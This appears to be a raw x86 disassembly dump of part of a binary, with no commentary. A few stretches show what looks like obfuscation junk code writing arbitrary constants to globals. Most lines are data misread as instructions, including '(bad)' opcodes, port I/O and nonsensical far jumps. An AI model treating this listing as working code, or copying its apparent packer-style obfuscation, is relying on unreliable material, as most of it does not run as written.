  40d4ec:	fbld   TBYTE PTR [ebp+0x357b7495]
  40d4f2:	push   0xffffffa3
  40d4f4:	inc    ecx
  40d4f5:	imul   edi,DWORD PTR [ebp+edx*2+0x5d53686b],0x9e69b1c
  40d500:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  40d507:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  40d50e:	and    DWORD PTR ds:0x42a7f5,0x42a805
  40d518:	add    edi,ebx
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	loopne 0x40d557
  40d577:	inc    esp
  40d578:	je     0x40d516
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0x5d78787e
  40d582:	fiadd  DWORD PTR [edx-0x29]
  40d585:	stc    
  40d586:	cmp    dl,BYTE PTR [eax+0x49]
  40d589:	and    DWORD PTR [eax-0x6fd4ddf3],ebx
  40d58f:	clc    
  40d590:	inc    eax
  40d591:	jmp    FWORD PTR [ecx+0x5c74306d]
  40d597:	daa    
  40d598:	and    bh,BYTE PTR [ebx-0x66e6e4c3]
  40d59e:	retf   0x7707
  40d5a1:	add    edx,esp
  40d5a3:	xor    ch,BYTE PTR [edx-0x13]
  40d5a6:	cmp    al,0xca
  40d5a8:	cld    
  40d5a9:	dec    edx
  40d5aa:	mov    dl,0x42
  40d5ac:	aaa    
  40d5ad:	lahf   
  40d5ae:	push   edx
  40d5af:	cmp    DWORD PTR [ebx-0x4e09a4d8],esp
  40d5b5:	mov    edx,0xfafc9457
  40d5ba:	jmp    0x40d636
  40d5bc:	das    
  40d5bd:	and    BYTE PTR [ebp-0x5597c27f],ch
  40d5c3:	sar    DWORD PTR [ebp-0x1b7c43e6],0xa
  40d5ca:	jno    0x40d601
  40d5cc:	push   ebp
  40d5cd:	mov    edi,0x7ef4df8c
  40d5d2:	lods   eax,DWORD PTR ds:[esi]
  40d5d3:	push   0x30
  40d5d5:	sub    eax,0xdaf8a844
  40d5da:	inc    ecx
  40d5db:	jne    0x40d5b7
  40d5dd:	pop    ebp
  40d5de:	into   
  40d5df:	sub    DWORD PTR [edx+0x5b],0xffffff93
  40d5e3:	jp     0x40d663
  40d5e5:	shl    DWORD PTR [eax],0x7f
  40d5e8:	mov    ebx,0x7c195ab9
  40d5ed:	jae    0x40d5a2
  40d5ef:	xchg   DWORD PTR [edi],esp
  40d5f1:	cdq    
  40d5f2:	rol    DWORD PTR [ecx+0x4aeb71d2],1
  40d5f8:	mov    dl,0x93
  40d5fa:	test   DWORD PTR [ebp+0x4900e58],esi
  40d600:	mov    ecx,0x373c442b
  40d605:	xor    al,0xac
  40d607:	idiv   BYTE PTR [esi-0x136cb493]
  40d60d:	repz sahf 
  40d60f:	push   es
  40d610:	ret    0xe29c
  40d613:	rol    BYTE PTR [eax-0x102c20bd],0x38
  40d61a:	sahf   
  40d61b:	inc    DWORD PTR [edi+eiz*4+0x19]
  40d61f:	sbb    eax,0xa26042ce
  40d624:	icebp  
  40d625:	(bad)  
  40d626:	jmp    0xe702e21
  40d62b:	cwde   
  40d62c:	data16 add al,0xea
  40d62f:	mov    cl,0x3
  40d631:	adc    al,0x30
  40d633:	jnp    0x40d67f
  40d635:	adc    esp,DWORD PTR [edi+0x5be8bab3]
  40d63b:	in     eax,0xe7
  40d63d:	in     al,0x8f
  40d63f:	lods   al,BYTE PTR ds:[esi]
  40d640:	pushf  
  40d641:	mov    ?,WORD PTR ds:0xae181017
  40d647:	jg     0x40d66f
  40d649:	arpl   sp,bp
  40d64b:	aad    0x4c
  40d64d:	mov    cl,0x73
  40d64f:	mov    ch,0xd2
  40d651:	adc    eax,0xe732c6b0
  40d656:	jbe    0x40d63e
  40d658:	dec    ecx
  40d659:	in     eax,0xec
  40d65b:	xlat   BYTE PTR ds:[ebx]
  40d65c:	test   DWORD PTR [edi],esp
  40d65e:	stos   BYTE PTR es:[edi],al
  40d65f:	mov    edi,0x34a9e4e1
  40d664:	(bad)
  40d667:	sub    BYTE PTR [eax+0x30],cl
  40d66a:	jmp    0xf804:0x4db3c0a2
  40d671:	jb     0x40d63c
  40d673:	ins    DWORD PTR es:[edi],dx
  40d674:	pop    esp
  40d675:	sub    DWORD PTR [ebp-0x1f8af50e],edx
  40d67b:	imul   DWORD PTR [edx-0x2d]
  40d67e:	(bad)  
  40d67f:	jns    0x40d6e9
  40d681:	ins    DWORD PTR es:[edi],dx
  40d682:	mov    ds:0x84951f35,al
  40d687:	jmp    DWORD PTR [edi-0x6d]
  40d68a:	std    
  40d68b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d68c:	cmp    bl,bl
  40d68e:	sbb    DWORD PTR [eax],ebx
  40d690:	lock ds stos BYTE PTR es:[edi],al
  40d693:	xchg   edi,eax
  40d694:	cs and eax,0x575282fb
  40d69a:	(bad)  
  40d69b:	jb     0x40d6d8
  40d69d:	pop    ebp
  40d69e:	out    0xfc,al
  40d6a0:	into   
  40d6a1:	jnp    0x40d65f
  40d6a3:	idiv   DWORD PTR [edi]
  40d6a5:	adc    edi,eax
  40d6a7:	dec    edi
  40d6a8:	dec    ebp
  40d6a9:	not    DWORD PTR [ebx-0x367178ba]
  40d6af:	cmp    al,0xe1
  40d6b1:	out    0x40,eax
  40d6b3:	pop    ebx
  40d6b4:	shr    BYTE PTR [ecx+0x5f],cl
  40d6b7:	test   BYTE PTR [ebp+0x65],0x8b
  40d6bb:	pop    edx
  40d6bc:	call   0x38bc9e6
  40d6c1:	push   0x3a
  40d6c3:	push   0xffffff87
  40d6c5:	pop    esp
  40d6c6:	jnp    0x40d658
  40d6c8:	and    bl,BYTE PTR [ebx-0x74c100b9]
  40d6ce:	adc    ah,BYTE PTR [ecx+edi*4+0x42]
  40d6d2:	jnp    0x40d6ac
  40d6d4:	clc    
  40d6d5:	jb     0x1ea6c7de
  40d6db:	pop    ebx
  40d6dc:	or     DWORD PTR [esi-0x13cb9a3c],ebx
  40d6e2:	adc    al,0xa2
  40d6e4:	sti    
  40d6e5:	std    
  40d6e6:	jno    0x40d72b
  40d6e8:	sub    al,0xb9
  40d6ea:	ror    ebp,1
  40d6ec:	inc    eax
  40d6ed:	sbb    esp,esi
  40d6ef:	test   eax,0xeb085627
  40d6f4:	mov    edx,0x2b5218a
  40d6f9:	ret    
  40d6fa:	dec    eax
  40d6fb:	lods   eax,DWORD PTR ds:[esi]
  40d6fc:	aad    0x18
  40d6fe:	cwde   
  40d6ff:	xor    cl,BYTE PTR [eax]
  40d701:	iret   
  40d702:	jb     0x40d6f5
  40d704:	in     eax,0x1b
  40d706:	out    dx,al
  40d707:	mov    DWORD PTR [ecx+0x6b],0xc6c121e7
  40d70e:	xchg   ebx,eax
  40d70f:	sbb    bh,dh
  40d711:	cdq    
  40d712:	icebp  
  40d713:	jne    0x40d763
  40d715:	in     eax,0xba
  40d717:	adc    eax,0xefd630fa
  40d71c:	popf   
  40d71d:	das    
  40d71e:	aad    0xfc
  40d720:	scas   eax,DWORD PTR es:[edi]
  40d721:	xor    al,0x77
  40d723:	push   cs
  40d724:	lea    eax,[ecx+0x73]
  40d727:	stos   DWORD PTR es:[edi],eax
  40d728:	sbb    bl,BYTE PTR [esi-0x7d]
  40d72b:	pop    eax
  40d72c:	ss int3 
  40d72e:	xchg   ebx,eax
  40d72f:	fcmovne st,st(5)
  40d731:	jmp    0xec4b:0x49b2eb6c
  40d738:	xchg   ebx,eax
  40d739:	(bad)  
  40d73a:	jbe    0x40d729
  40d73c:	xor    BYTE PTR [ecx],cl
  40d73e:	cli    
  40d73f:	xchg   ebx,eax
  40d740:	bound  ecx,QWORD PTR ds:0x68679b2c
  40d746:	jae    0x40d725
  40d748:	fcmovb st,st(4)
  40d74a:	les    eax,FWORD PTR [eax-0x3c]
  40d74d:	or     edx,esi
  40d74f:	or     al,0x45
  40d751:	bound  esp,QWORD PTR [edi+0xdd473dd]
  40d757:	inc    edi
  40d758:	fwait
  40d759:	iret   
  40d75a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d75b:	push   edx
  40d75c:	cld    
  40d75d:	lods   al,BYTE PTR ds:[esi]
  40d75e:	sub    edi,eax
  40d760:	in     eax,dx
  40d761:	clc    
  40d762:	cmp    ebx,DWORD PTR [ebp+0x7a]
  40d765:	mov    eax,0x59515e94
  40d76a:	mov    ch,0xe8
  40d76c:	jmp    0x38d3:0xc846b193
  40d773:	mov    dl,0x31
  40d775:	ds mov edx,0x2a8b71a9
  40d77b:	inc    esi
  40d77c:	xchg   edi,eax
  40d77d:	or     DWORD PTR [esi-0x26007214],ebp
  40d783:	inc    esp
  40d784:	push   ebp
  40d785:	push   esi
  40d786:	fwait
  40d787:	adc    al,0x9
  40d789:	pop    edx
  40d78a:	out    dx,al
  40d78b:	hlt    
  40d78c:	cdq    
  40d78d:	push   ds
  40d78e:	add    eax,0xf1cae8c4
  40d793:	lock pushf 
  40d795:	mov    dl,0x2f
  40d797:	sub    eax,ebp
  40d799:	je     0x40d741
  40d79b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d79c:	in     al,dx
  40d79d:	das    
  40d79e:	inc    ebp
  40d79f:	mov    DWORD PTR [ebp-0x71],eax
  40d7a2:	inc    edx
  40d7a3:	pop    eax
  40d7a4:	xor    eax,0x6af7f081
  40d7a9:	xor    al,BYTE PTR [edx-0x4fc0264c]
  40d7af:	sub    DWORD PTR [edx],edx
  40d7b1:	jmp    0x435d:0xad7a92dc
  40d7b8:	jle    0x40d76c
  40d7ba:	into   
  40d7bb:	add    BYTE PTR [ecx+0x33cff],0x0
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0x750b1ba3]
  40d7eb:	int    0xc7
  40d7ed:	pop    ecx
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	mov    edx,0xa8d87e76
  40d7fa:	jmp    0x40d820
  40d7fc:	rcr    BYTE PTR [edi],1
  40d7fe:	mov    ah,0x63
  40d800:	jns    0x40d846
  40d802:	inc    edx
  40d803:	dec    edi
  40d804:	cmc    
  40d805:	or     DWORD PTR [edi-0x783fbae],ebx
  40d80b:	pop    ss
  40d80c:	jecxz  0x40d7da
  40d80e:	ss push esp
  40d810:	xor    al,0x95
  40d812:	icebp  
  40d813:	inc    eax
  40d814:	test   eax,0xf332002
  40d819:	out    dx,eax
  40d81a:	add    eax,0x328ad6eb
  40d81f:	test   DWORD PTR [esi+0x58],ebx
  40d822:	mov    ds:0x69400e9f,al
  40d827:	add    eax,0xa52eed8f
  40d82c:	adc    eax,0x55edbbfa
  40d831:	jno    0x40d889
  40d833:	stos   DWORD PTR es:[edi],eax
  40d834:	dec    esp
  40d835:	dec    eax
  40d836:	jo     0x40d87c
  40d838:	popa   
  40d839:	dec    eax
  40d83a:	call   0x5113:0xb7037d47
  40d841:	mov    ebp,0x9022d46f
  40d846:	int3   
  40d847:	jmp    0x7567:0x61652c7a
  40d84e:	xchg   esi,eax
  40d84f:	xor    DWORD PTR [esi],edi
  40d851:	cmp    ch,BYTE PTR [esi-0x72]
  40d854:	xor    esp,DWORD PTR [ecx-0x1a2c3ba8]
  40d85a:	or     dl,BYTE PTR [ebp-0x21]
  40d85d:	pop    edx
  40d85e:	fld    TBYTE PTR ds:0x160eec43
  40d864:	sub    DWORD PTR [eax],0x72ba8c56
  40d86a:	lock lea eax,[edx+eiz*1-0x3c]
  40d86f:	inc    ecx
  40d870:	jb     0x40d822
  40d872:	sub    DWORD PTR [edx+ebp*1],ebp
  40d875:	inc    ecx
  40d876:	pop    ecx
  40d877:	jnp    0x40d893
  40d879:	inc    eax
  40d87a:	js     0x40d806
  40d87c:	adc    esi,DWORD PTR [ebp+0x328a47c4]
  40d882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d883:	popa   
  40d884:	cmp    al,0x2b
  40d886:	outs   dx,BYTE PTR ds:[esi]
  40d887:	neg    DWORD PTR [ecx]
  40d889:	cs pop edx
  40d88b:	bound  esi,QWORD PTR ds:0x4cf3cb8e
  40d891:	cmp    eax,0x4e1a8f7e
  40d896:	adc    al,0x42
  40d898:	xor    ch,BYTE PTR [esi+0x3bb4182b]
  40d89e:	push   es
  40d89f:	sbb    al,bh
  40d8a1:	rol    BYTE PTR [edx-0x43],1
  40d8a4:	xor    edi,DWORD PTR [edx-0x44]
  40d8a7:	pusha  
  40d8a8:	cmp    bh,BYTE PTR [ecx]
  40d8aa:	jg     0x40d898
  40d8ac:	bound  ecx,QWORD PTR [ebx]
  40d8ae:	mov    cl,0x7e
  40d8b0:	fcmovne st,st(4)
  40d8b2:	shl    DWORD PTR [ebp+edi*4-0x5f2932f0],cl
  40d8b9:	fxch   st(5)
  40d8bb:	push   esp
  40d8bc:	xchg   ebx,eax
  40d8bd:	push   esi
  40d8be:	out    dx,al
  40d8bf:	test   ebp,ebp
  40d8c1:	jne    0x40d8e6
  40d8c3:	icebp  
  40d8c4:	in     al,0xab
  40d8c6:	inc    ebp
  40d8c7:	cmp    al,0x29
  40d8c9:	(bad)  
  40d8ca:	or     bl,BYTE PTR [ecx]
  40d8cc:	adc    ah,al
  40d8ce:	test   eax,0xc0e62cfc
  40d8d3:	dec    eax
  40d8d4:	repnz cwde 
  40d8d6:	std    
  40d8d7:	outs   dx,DWORD PTR ds:[esi]
  40d8d8:	dec    edx
  40d8d9:	push   ebx
  40d8da:	add    ebx,DWORD PTR [ecx+0x61a66353]
  40d8e0:	sub    ch,BYTE PTR [esi]
  40d8e2:	dec    edi
  40d8e3:	ret    
  40d8e4:	mov    al,ds:0xf87e5ed5
  40d8e9:	adc    BYTE PTR [ebp-0x1c53639d],cl
  40d8ef:	in     al,0x24
  40d8f1:	mov    WORD PTR [ebx],?
  40d8f3:	(bad)  
  40d8f4:	popa   
  40d8f5:	sub    al,0xbb
  40d8f7:	lea    eax,[esp+ebx*4-0x19]
  40d8fb:	ror    DWORD PTR [edi+0x50],0xf1
  40d8ff:	xor    ah,BYTE PTR [edi-0x58]
  40d902:	mov    ebx,0xea81be68
  40d907:	out    0x33,al
  40d909:	sub    bh,al
  40d90b:	aad    0x24
  40d90d:	scas   eax,DWORD PTR es:[edi]
  40d90e:	push   ax
  40d910:	lock fnsetpm(287 only) 
  40d913:	iret   
  40d914:	or     al,0xcf
  40d916:	mov    edi,0xcbb0dcaf
  40d91b:	pop    eax
  40d91c:	aam    0x25
  40d91e:	pop    edi
  40d91f:	push   0x22
  40d921:	outs   dx,BYTE PTR ds:[esi]
  40d922:	bound  eax,QWORD PTR [ebx+0x2]
  40d925:	sbb    BYTE PTR [ecx+ebx*2+0x74],dh
  40d929:	std    
  40d92a:	jne    0x40d979
  40d92c:	push   esp
  40d92d:	mov    al,ds:0x859dd56b
  40d932:	fst    st(2)
  40d934:	cwde   
  40d935:	ins    BYTE PTR es:[edi],dx
  40d936:	enter  0x94ac,0xd9
  40d93a:	pusha  
  40d93b:	gs (bad) 
  40d93d:	dec    esi
  40d93e:	in     al,dx
  40d93f:	mov    ds:0xd3b713f3,eax
  40d944:	shl    DWORD PTR [edi],cl
  40d946:	(bad)  
  40d947:	test   DWORD PTR [eax-0x13],0x33ba55c1
  40d94e:	fdiv   DWORD PTR [edi+0x4f]
  40d951:	jbe    0x40d981
  40d953:	sub    al,0xf0
  40d955:	shl    BYTE PTR [edi],0xf0
  40d958:	push   eax
  40d959:	(bad)  
  40d95a:	mov    al,0x5e
  40d95c:	jecxz  0x40d96b
  40d95e:	shl    ebp,1
  40d960:	push   cs
  40d961:	(bad)  
  40d962:	js     0x40d8f8
  40d964:	aas    
  40d965:	dec    esp
  40d966:	ror    BYTE PTR [ecx+0x2c],0xa6
  40d96a:	fcmovne st,st(5)
  40d96c:	or     al,0x5
  40d96e:	dec    BYTE PTR [eax+0x46]
  40d971:	arpl   WORD PTR [eax],di
  40d973:	xchg   ebp,eax
  40d974:	jnp    0x40d966
  40d976:	dec    esi
  40d977:	sar    DWORD PTR [ebx],1
  40d979:	cli    
  40d97a:	fwait
  40d97b:	jp     0x40d916
  40d97d:	dec    ecx
  40d97e:	(bad)  
  40d980:	rcr    DWORD PTR [ecx],cl
  40d982:	xchg   BYTE PTR [edi],ch
  40d984:	sbb    DWORD PTR [eax],0x2
  40d987:	loopne 0x40d9b8
  40d989:	jns    0x40d9e6
  40d98b:	xchg   ebp,esi
  40d98d:	cld    
  40d98e:	inc    ebx
  40d98f:	(bad)  
  40d990:	pop    ecx
  40d991:	jno    0x40d97e
  40d993:	fld    QWORD PTR [ecx+edi*4]
  40d996:	push   ds
  40d997:	pop    ebx
  40d998:	ret    
  40d999:	jno    0x40d978
  40d99b:	mov    al,ds:0x52bb2596
  40d9a0:	es push ds
  40d9a2:	jmp    0x798:0xd2a1e446
  40d9a9:	out    dx,al
  40d9aa:	inc    esp
  40d9ab:	popa   
  40d9ac:	inc    edi
  40d9ad:	adc    esi,ebx
  40d9af:	(bad)  
  40d9b0:	repz leave 
  40d9b2:	iret   
  40d9b3:	jnp    0x40da32
  40d9b5:	dec    edi
  40d9b6:	mov    ds:0xff9eb38a,eax
  40d9bb:	mov    gs,WORD PTR [edx-0x2f74a013]
  40d9c1:	mov    edi,DWORD PTR [ebx]
  40d9c3:	push   es
  40d9c4:	xchg   DWORD PTR [ebp+0x450da57e],edi
  40d9ca:	cmp    al,0x76
  40d9cc:	fst    QWORD PTR [ecx+0x16ef3b68]
  40d9d2:	in     eax,0x27
  40d9d4:	sbb    al,0xc2
  40d9d6:	pop    es
  40d9d7:	sti    
  40d9d8:	mov    ch,0x36
  40d9da:	dec    ebx
  40d9db:	mov    ch,0x88
  40d9dd:	call   0xb59cf68e
  40d9e2:	push   cs
  40d9e3:	loop   0x40d99d
  40d9e5:	in     al,dx
  40d9e6:	lea    ebx,[esi-0x2f5b9843]
  40d9ec:	dec    eax
  40d9ed:	retf   0x5c8f
  40d9f0:	fldcw  WORD PTR ds:0xf4a49d5d
  40d9f6:	mov    bl,0xf6
  40d9f8:	dec    esi
  40d9f9:	lods   al,BYTE PTR ds:[esi]
  40d9fa:	mov    ds,WORD PTR [esi-0x7993bf8]
  40da00:	sbb    DWORD PTR [eax+0x19],esi
  40da03:	jecxz  0x40d9bb
  40da05:	and    eax,DWORD PTR [eax]
  40da07:	sbb    DWORD PTR [ebp+0x2],esi
  40da0a:	cmc    
  40da0b:	dec    edx
  40da0c:	fmul   DWORD PTR [ebx]
  40da0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da0f:	ss or  ah,ah
  40da12:	push   esp
  40da13:	int    0x1f
  40da15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da16:	fs push ebp
  40da18:	xchg   edi,eax
  40da19:	pusha  
  40da1a:	stc    
  40da1b:	inc    esp
  40da1c:	xchg   esp,eax
  40da1d:	stc    
  40da1e:	(bad)  
  40da1f:	cmp    BYTE PTR ds:0x273570a,bh
  40da25:	sbb    al,0xcc
  40da27:	outs   dx,BYTE PTR ds:[esi]
  40da28:	(bad)  
  40da29:	sbb    al,0x9c
  40da2b:	cld    
  40da2c:	into   
  40da2d:	fwait
  40da2e:	sbb    DWORD PTR [edx+0x86583],esi
  40da34:	mov    eax,ds:0x42a831
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	inc    ebx
  40da7e:	jge    0x40da4d
  40da80:	call   0x78b9889b
  40da85:	xor    eax,0xbb78787e
  40da8a:	cmp    al,0x77
  40da8c:	cdq    
  40da8d:	push   eax
  40da8e:	push   esp
  40da8f:	mov    bl,bl
  40da91:	popf   
  40da92:	cdq    
  40da93:	mov    edi,0x72f3e4cd
  40da98:	mov    edi,0x709cbd6a
  40da9d:	dec    edx
  40da9e:	or     eax,0xa7660456
  40daa3:	lea    edi,[edi+eax*2]
  40daa6:	inc    ebp
  40daa7:	sub    edi,DWORD PTR ds:0x221c6f47
  40daad:	pushf  
  40daae:	cmp    eax,DWORD PTR [esi]
  40dab0:	cmp    al,0xea
  40dab2:	or     eax,0x84d25d74
  40dab7:	jae    0x40dab9
  40dab9:	clc    
  40daba:	call   0x4259c3b5
  40dabf:	aam    0x10
  40dac1:	pop    ss
  40dac2:	add    edx,esp
  40dac4:	stc    
  40dac5:	mov    ah,0xe5
  40dac7:	sub    ebx,ecx
  40dac9:	fidiv  WORD PTR [ecx]
  40dacb:	loop   0x40dac4
  40dacd:	ds int3 
  40dacf:	sub    eax,0x24a1bb8f
  40dad4:	repnz mov edi,edi
  40dad7:	sar    BYTE PTR [ecx+0x52],0x3c
  40dadb:	jb     0x40da66
  40dadd:	(bad)  
  40dade:	mov    ebp,0xce4809c3
  40dae3:	sbb    DWORD PTR [esi+0x73fbfdb9],0x85c47c6b
  40daed:	fdivr  QWORD PTR [edx]
  40daef:	and    al,0x41
  40daf1:	push   ebx
  40daf2:	jne    0x40daf1
  40daf4:	cmp    ecx,DWORD PTR [edi]
  40daf6:	addr16 cld 
  40daf8:	int    0x7c
  40dafa:	int    0xe5
  40dafc:	loope  0x40db2f
  40dafe:	loope  0x40daef
  40db00:	adc    BYTE PTR [ecx],dl
  40db02:	je     0x40db38
  40db04:	test   ah,0x40
  40db07:	shl    edi,1
  40db09:	sub    al,0xa7
  40db0b:	cdq    
  40db0c:	pop    es
  40db0d:	je     0x40db78
  40db0f:	cmp    eax,DWORD PTR [eax]
  40db11:	aad    0x2d
  40db13:	cmp    BYTE PTR [ebx+0x48f94d6c],0x8a
  40db1a:	or     al,0x75
  40db1c:	dec    edi
  40db1d:	sub    bl,dh
  40db1f:	fild   QWORD PTR [edx+esi*8+0xb7a7b1]
  40db26:	stos   WORD PTR es:[edi],ax
  40db28:	pop    ss
  40db29:	div    ebp
  40db2b:	mov    ecx,0x8ebcd029
  40db30:	cmp    ah,BYTE PTR [ebx]
  40db32:	add    bl,ah
  40db34:	push   edi
  40db35:	imul   ebp,DWORD PTR [ebx+0x2b4b49e5],0x1822d548
  40db3f:	std    
  40db40:	mov    ebx,0x42e45a6d
  40db45:	add    DWORD PTR ds:0x277a6ab4,0x86aea680
  40db4f:	inc    ebp
  40db50:	mov    eax,ds:0x1aa2ef4f
  40db55:	inc    ebx
  40db56:	out    0xb3,eax
  40db58:	adc    eax,0x358df6eb
  40db5d:	clc    
  40db5e:	cmp    eax,0xfdef9bcc
  40db63:	sbb    esi,DWORD PTR [eax]
  40db65:	jle    0x40db9b
  40db67:	fsin   
  40db69:	push   0xffffffb3
  40db6b:	jmp    0x40db8d
  40db6d:	daa    
  40db6e:	jno    0x40db57
  40db70:	(bad)  
  40db71:	ffreep st(4)
  40db73:	jno    0x40db6d
  40db75:	push   ss
  40db76:	popf   
  40db77:	jp     0x40dbcd
  40db79:	add    eax,0x9c7c70f2
  40db7e:	and    esi,ecx
  40db80:	pop    ss
  40db81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db82:	shl    DWORD PTR [eax-0x5c2e4ced],cl
  40db88:	cwde   
  40db89:	or     BYTE PTR [esi+0x4e68a6b2],dh
  40db8f:	popf   
  40db90:	mov    edx,0x76c44b98
  40db95:	(bad)  
  40db96:	jae    0x40dbf6
  40db98:	add    al,0xc
  40db9a:	dec    edx
  40db9b:	push   0x582410e1
  40dba0:	pop    ecx
  40dba1:	test   eax,0x2f6e413d
  40dba6:	shl    BYTE PTR [eax],0x86
  40dba9:	out    0x1e,eax
  40dbab:	scas   eax,DWORD PTR es:[edi]
  40dbac:	mov    ebx,0xa0d44c26
  40dbb1:	idiv   DWORD PTR [edi]
  40dbb3:	dec    eax
  40dbb4:	or     eax,0xff846103
  40dbb9:	cli    
  40dbba:	and    DWORD PTR [edi],edx
  40dbbc:	mov    cl,0xfb
  40dbbe:	sbb    al,0x81
  40dbc0:	xchg   ebx,eax
  40dbc1:	ret    0x1832
  40dbc4:	das    
  40dbc5:	sub    eax,0x99b2551c
  40dbca:	(bad)  
  40dbcb:	enter  0xb9ba,0xbf
  40dbcf:	dec    esp
  40dbd0:	add    BYTE PTR [esi],0x38
  40dbd3:	lahf   
  40dbd4:	loop   0x40dbd0
  40dbd6:	push   0x8c71e47d
  40dbdb:	mov    dh,0xac
  40dbdd:	xor    ebp,DWORD PTR [eax]
  40dbdf:	pop    ds
  40dbe0:	add    BYTE PTR [edx-0xf5615e0],bh
  40dbe6:	and    bl,BYTE PTR [edi-0x547fcb58]
  40dbec:	outs   dx,BYTE PTR ds:[esi]
  40dbed:	mov    al,0xf9
  40dbef:	or     ah,bl
  40dbf1:	pop    edi
  40dbf2:	sub    DWORD PTR ds:0x44455709,edx
  40dbf8:	jge    0x40db9d
  40dbfa:	dec    eax
  40dbfb:	lahf   
  40dbfc:	xchg   BYTE PTR [eax-0x48],dl
  40dbff:	mov    ?,eax
  40dc01:	cwde   
  40dc02:	sbb    esp,0x77
  40dc05:	xor    dh,0xb1
  40dc08:	mov    bh,BYTE PTR [eax+0x196cd55b]
  40dc0e:	aaa    
  40dc0f:	gs ret 
  40dc11:	push   ss
  40dc12:	mov    eax,0xf98a3e63
  40dc17:	stos   DWORD PTR es:[edi],eax
  40dc18:	rcl    BYTE PTR [esi-0x6b294434],1
  40dc1e:	and    DWORD PTR ds:0x16964970,esi
  40dc24:	gs ss std 
  40dc27:	push   ebx
  40dc28:	jl     0x40dca7
  40dc2a:	adc    cl,ch
  40dc2c:	mul    BYTE PTR [edx]
  40dc2e:	or     esi,edx
  40dc30:	add    al,0x1d
  40dc32:	retf   
  40dc33:	hlt    
  40dc34:	je     0x40dc02
  40dc36:	in     eax,0x8d
  40dc38:	pop    es
  40dc39:	push   edi
  40dc3a:	adc    al,0x52
  40dc3c:	adc    esi,ecx
  40dc3e:	or     ebx,0xd
  40dc41:	(bad)  
  40dc42:	bnd jmp 0xe61978f4
  40dc48:	sub    dl,dh
  40dc4a:	fwait
  40dc4b:	or     al,0x5a
  40dc4d:	mov    eax,ds:0xf994619b
  40dc52:	cdq    
  40dc53:	jbe    0x40dbfe
  40dc55:	(bad)  
  40dc56:	xchg   esp,eax
  40dc57:	jmp    0xc07a:0x439f665f
  40dc5e:	mov    cl,0x5
  40dc60:	ficom  DWORD PTR [ebp-0x5efdaed9]
  40dc66:	adc    DWORD PTR [edi-0x25],esi
  40dc69:	push   eax
  40dc6a:	pushf  
  40dc6b:	dec    ebp
  40dc6c:	dec    ebx
  40dc6d:	in     eax,0x7b
  40dc6f:	jmp    0x40dcde
  40dc71:	lods   al,BYTE PTR ds:[esi]
  40dc72:	and    DWORD PTR [eax+0x2b],eax
  40dc75:	mov    ebp,0xd3178124
  40dc7a:	sub    ecx,DWORD PTR [ecx+eiz*1+0x2b8bfcba]
  40dc81:	lahf   
  40dc82:	pop    ds
  40dc83:	mov    bh,0x47
  40dc85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc86:	xlat   BYTE PTR ds:[ebx]
  40dc87:	out    dx,eax
  40dc88:	dec    edx
  40dc89:	push   DWORD PTR [ecx+0x2dec4f39]
  40dc8f:	or     BYTE PTR [eax-0x6b],bh
  40dc92:	out    dx,eax
  40dc93:	shl    edx,0x17
  40dc96:	mov    dh,BYTE PTR [eax-0x4b]
  40dc99:	add    ch,BYTE PTR [esi]
  40dc9b:	stos   DWORD PTR es:[edi],eax
  40dc9c:	jmp    0xa8c8:0x41d870de
  40dca3:	into   
  40dca4:	or     al,0xd0
  40dca6:	add    al,0x8d
  40dca8:	jno    0x40dcda
  40dcaa:	adc    dh,bl
  40dcac:	mov    DWORD PTR [ecx+esi*1],ecx
  40dcaf:	fbld   TBYTE PTR [eax]
  40dcb1:	or     DWORD PTR [ecx+0x59d65bb6],0x8e507956
  40dcbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcbc:	jmp    0x40dd23
  40dcbe:	out    0x1d,al
  40dcc0:	fisub  WORD PTR [ecx+0x4503f053]
  40dcc6:	or     BYTE PTR [ecx+0x42a88105],al
